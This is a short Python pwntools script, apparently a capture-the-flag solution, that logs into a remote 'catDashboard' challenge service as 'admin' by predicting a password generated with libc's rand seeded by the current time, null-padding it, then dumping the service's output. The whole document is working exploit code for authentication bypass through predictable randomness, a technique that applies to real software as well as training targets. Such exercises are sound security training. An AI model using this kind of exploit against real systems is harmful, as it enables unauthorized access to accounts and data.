from pwn import *
import ctypes
import time

context.log_level = "debug"

libc = ctypes.CDLL("libc.so.6")
libc.srand.argtypes = [ctypes.c_int]

#BINARY = "./catDashboard"

#p = process(BINARY)
p = remote("cyberchallenge.diag.uniroma1.it", "5271")

p.sendline(b"1")
#p.recvline()

p.sendline(b"admin")
#p.recvline()

currtime = time.time()
libc.srand(int(currtime))
password = libc.rand()
password = str(password)
p.send(password.encode())
for i in range(1, 19-len(str(password))):
    p.send(b"\x00")
p.sendline(b"")

#p.sendline("".encode())     #needed for the 1n ad the end
p.recvline()

p.sendline(b"2")

while(True):
    ao=p.recvline()
    print(ao.decode())
